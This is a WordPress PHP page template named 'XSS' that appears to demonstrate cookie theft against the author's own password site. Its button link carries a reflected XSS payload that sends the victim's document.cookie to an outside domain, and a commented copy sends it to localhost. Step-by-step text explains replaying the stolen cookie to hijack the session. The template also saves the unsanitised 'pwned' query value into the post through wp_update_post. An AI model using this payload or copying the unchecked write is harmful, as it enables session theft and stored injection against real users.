<?php
/**
 * Template Name: XSS
 *
 */

header("Allow Origin: https://passwords.briansimoni.com");
get_header();
?>

<div id="content">
    <div class="container">
        <ol>
            <li>In another tab open <a href="https://passwords.briansimoni.com">passwords.briansimoni.com</a> and login</li>
            <li>Come back to this page and click the red button</li>
            <li>The cookie on the page will update because you got pwned by an XSS attack</li>
            <li>On another computer, or browser, or incognito tab, go to passwrods.briansimoni.com/secrets</li>
            <li>Set <code>document.cookie = 'cookie that was stolen'</code></li>
            <li>Refresh the page</li>
        </ol>
        <?php
        ?>

        <!-- "https://passwords.briansimoni.com/?status=<script>window.location %3D 'https://briansimoni.com/xss?pwned%3D' %2B document.cookie;</script>" -->
        <!-- <a style="color: red;" href="https://passwords.briansimoni.com/?status=%3Cscript%3Ewindow.location%3D'http%3A%2F%2Flocalhost%3A9093%2Fxss%3Fpwned%3D'.concat(document.cookie)%3B%3C%2Fscript%3E">Click me bb!</a>-->
        <a style="color: red;" href="https://passwords.briansimoni.com/?status=%3Cscript%3Ewindow.location%3D'https%3A%2F%2Fbriansimoni.com%2Fxss%3Fpwned%3D'.concat(document.cookie)%3B%3C%2Fscript%3E">Click me bb!</a>
        <br />
        <?php

        $post = get_post();
        echo $post->post_content;
        $post->post_content;
        if(isset($_GET['pwned'])) {
            $post->post_content = $_GET['pwned'];
            wp_update_post($post);
        }

        ?>
    </div>
</div>


<?php
get_footer();